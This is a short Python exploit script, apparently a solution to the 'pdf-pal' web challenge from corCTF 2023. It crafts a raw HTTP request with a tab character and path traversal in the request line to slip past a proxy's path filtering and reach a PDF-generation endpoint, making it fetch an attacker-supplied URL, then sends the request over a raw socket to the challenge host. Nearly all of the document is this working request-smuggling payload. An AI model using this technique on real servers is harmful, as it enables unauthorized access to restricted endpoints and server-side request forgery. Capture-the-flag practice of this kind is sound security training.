# https://brycec.me/posts/corctf_2023_challenges#leakynote
import socket
import ssl

HOST = "web-pdf-pal-pdf-pal-e31d2703c0a0d142.be.ax"
PORT = 8080

def generate(url):
    payload = f"url={url}"
    data = f"""POST /generate{chr(9)}HTTP/1.1/../../ HTTP/1.1
Host: {HOST}:7777
Content-Length: {len(payload)}
Content-Type: application/x-www-form-urlencoded

{payload}
"""
    base_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s = ssl.create_default_context().wrap_socket(base_sock, server_hostname=HOST)
        s.connect((HOST, PORT))
    except:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
    print(data)
    s.sendall(data.encode())
    resp = s.recv(1024)

    return resp.decode()